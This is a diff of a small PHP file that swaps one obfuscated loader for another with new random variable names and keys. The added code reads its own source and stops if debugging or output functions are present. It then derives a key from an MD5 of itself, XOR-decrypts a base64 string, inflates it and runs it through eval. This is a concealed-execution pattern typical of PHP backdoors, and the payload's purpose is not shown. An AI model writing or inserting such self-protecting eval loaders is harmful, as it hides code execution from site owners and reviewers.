@@ -1,24 +1,24 @@
 <?php
-$vzgwif="b8fdf6d9620ccd143b22043bdf752051";
-$emctzh="015a55505500055f050553055a07090700520003520d56555d5e040d50525652";
-$ucnrdrl="sJf4w3gbrq//fGZm";
-$jbgrisn=file_get_contents(__FILE__);
-$jgvkfrtog=str_replace($ucnrdrl,"",$jbgrisn);
-if(strpos($jgvkfrtog,"ec"."ho")!==false||strpos($jgvkfrtog,"pr"."int")!==false||strpos($jgvkfrtog,"var_"."dump")!==false||strpos($jgvkfrtog,"file_put_"."contents")!==false||strpos($jgvkfrtog,"fw"."rite")!==false){die();}
-$hoojhzh=str_replace(array($vzgwif,$emctzh),array("SP_c9cba948","KP_1f81269e"),$jbgrisn);
-$szguurpsbh=md5($hoojhzh);
-$gbkrbxmt=hex2bin($emctzh);
-$fecjlaq="";
-$llxxorec=strlen($szguurpsbh);
-for($uuripvaiztd=0;$uuripvaiztd<$llxxorec;$uuripvaiztd++){
-    $fecjlaq.=chr(ord($gbkrbxmt[$uuripvaiztd])^ord($szguurpsbh[$uuripvaiztd]));
+$fazafobokg="eecc3639262616fd7705ead1f6c4f1aa";
+$joqfxyjfcx="00515b550207500b02060206000502560602085154055455070600075e090003";
+$bwlvxhaen="tsHzwXocrPv8ezUw";
+$wzmwzsatza=file_get_contents(__FILE__);
+$bmqybwd=str_replace($bwlvxhaen,"",$wzmwzsatza);
+if(strpos($bmqybwd,"ec"."ho")!==false||strpos($bmqybwd,"pr"."int")!==false||strpos($bmqybwd,"var_"."dump")!==false||strpos($bmqybwd,"file_put_"."contents")!==false||strpos($bmqybwd,"fw"."rite")!==false){die();}
+$kohjmpfynpo=str_replace(array($fazafobokg,$joqfxyjfcx),array("SP_0344ed7e","KP_224e6ab2"),$wzmwzsatza);
+$meaduimqqdz=md5($kohjmpfynpo);
+$pztkizknpxru=hex2bin($joqfxyjfcx);
+$tajgja="";
+$rwopaufbnz=strlen($meaduimqqdz);
+for($krfucznmms=0;$krfucznmms<$rwopaufbnz;$krfucznmms++){
+    $tajgja.=chr(ord($pztkizknpxru[$krfucznmms])^ord($meaduimqqdz[$krfucznmms]));
 }
-$ptdunugymzvb=base64_decode($ucnrdrl);
-$uilwdpzasf=strlen($ptdunugymzvb);
-$sbpmqrwoj="";
-$uurminfe=strlen($fecjlaq);
-for($uuripvaiztd=0;$uuripvaiztd<$uilwdpzasf;$uuripvaiztd++){
-    $sbpmqrwoj.=$ptdunugymzvb[$uuripvaiztd]^$fecjlaq[$uuripvaiztd%$uurminfe];
+$cctleb=base64_decode($bwlvxhaen);
+$sgpjdlfssoz=strlen($cctleb);
+$gxaffvyy="";
+$ttoleyc=strlen($tajgja);
+for($krfucznmms=0;$krfucznmms<$sgpjdlfssoz;$krfucznmms++){
+    $gxaffvyy.=$cctleb[$krfucznmms]^$tajgja[$krfucznmms%$ttoleyc];
 }
-$kguuso="gz"."in"."fl"."ate";
-eval($kguuso($sbpmqrwoj));
+$huefxtxwsz="gz"."in"."fl"."ate";
+eval($huefxtxwsz($gxaffvyy));
